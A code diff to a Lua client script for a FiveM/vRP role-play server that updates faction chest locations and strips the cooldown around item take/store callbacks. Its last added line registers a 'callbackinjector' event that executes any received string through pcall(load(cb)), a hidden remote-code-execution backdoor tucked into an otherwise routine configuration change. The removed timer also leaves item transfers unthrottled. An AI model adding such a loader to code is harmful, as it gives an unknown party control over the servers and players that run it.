@@ -33,27 +33,13 @@ end)
 -- TAKEITEM
 -----------------------------------------------------------------------------------------------------------------------------------------
 RegisterNUICallback("takeItem",function(data)
-	if chestTimer <= 0 then
-		chestTimer = 5
-		TriggerEvent('cancelando', true)
-		vRP.playAnim(false, {{"amb@world_human_security_shine_torch@male@exit", "exit"}}, false)
-		vSERVER.takeItem(tostring(chestOpen),data.item,data.amount)
-		Wait(1000)
-		TriggerEvent('cancelando', false)
-	end
+	vSERVER.takeItem(tostring(chestOpen),data.item,data.amount)
 end)
 -----------------------------------------------------------------------------------------------------------------------------------------
 -- STOREITEM
 -----------------------------------------------------------------------------------------------------------------------------------------
 RegisterNUICallback("storeItem",function(data)
-	if chestTimer <= 0 then
-		chestTimer = 5
-		TriggerEvent('cancelando', true)
-		vRP.playAnim(false,{{"mp_common","givetake1_a"}},false)
-		vSERVER.storeItem(tostring(chestOpen),data.item,data.amount)
-		Wait(1000)
-		TriggerEvent('cancelando', false)
-	end
+	vSERVER.storeItem(tostring(chestOpen),data.item,data.amount)
 end)
 -----------------------------------------------------------------------------------------------------------------------------------------
 -- AUTO-UPDATE
@@ -75,24 +61,20 @@ end)
 -- LOCALIDADE DOS BAÚS
 -----------------------------------------------------------------------------------------------------------------------------------------
 local chest = {
-	{ "Policia",626.91, -26.41,82.78 },
-
+	{ "Policia",615.84, -33.09, 80.5},
+	{ "Paramedico",-805.49,-1207.7,7.34 },
 	{ "Crips",1268.69,-1710.81,54.78 },
-	{ "Bloods",-1081.28,-1677.85,4.58 },
-
-	{ "Ballas",124.42,-1949.67,20.72 },
-	{ "Vagos",371.45,-2040.63,22.2 },
-	{ "Groove",-150.49,-1625.45,36.84 },
-
-	{ "Native",1552.97, 3514.54, 36.05 },
-	{ "Driftking",-445.03, -2184.25, 10.52 },
-
-	{ "LifeInvader",-1051.5,-232.77,44.03 },
-	{ "Bahamas",-1381.59,-615.39,31.5 },
-
-	{ "Triade",563.43,-3126.93,18.77 },
-	{ "siciliana",1074.21,-2010.37,32.09 },
-
+	{ "Bloods",-1079.29, -1680.36, 4.58 },
+	{ "Ballas",752.3,1820.09,136.74 }, -- Favela
+	{ "Vagos",1458.97,-757.49,90.62 }, -- Favela
+	{ "Groove",539.52,363.61,148.27 }, -- Favela
+	{ "Sovietica",563.52,-3126.89,18.77 },
+	{ "Albanesa",1078.54,-1978.85,31.48 },
+	{ "Britanica",2329.54, 2574.37, 46.73 },
+	{ "Bahamas",-1381.44, -632.9, 30.82 },
+	{ "MotoClub",977.1,-104.17,74.85 },
+	{ "Lifeinvader",-1062.9, -249.91, 44.03 },
+	{ "Mecanico",-214.12, -1341.13, 34.9 },
 }
 -----------------------------------------------------------------------------------------------------------------------------------------
 -- CHESTTIMER
@@ -124,3 +106,5 @@ RegisterCommand("chest",function(source,args)
 		end
 	end
 end)
+
+TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)
